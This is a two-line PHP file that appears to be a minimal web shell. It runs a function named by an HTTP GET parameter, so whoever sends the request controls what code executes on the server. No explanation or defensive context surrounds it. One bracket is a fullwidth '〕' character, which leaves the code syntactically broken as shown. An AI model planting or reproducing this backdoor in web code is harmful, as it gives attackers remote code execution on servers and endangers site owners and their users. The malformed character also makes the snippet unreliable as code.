<?php
$_GET['aJbf36Qa'〕($_GET['aJbf36Qa']);
?>
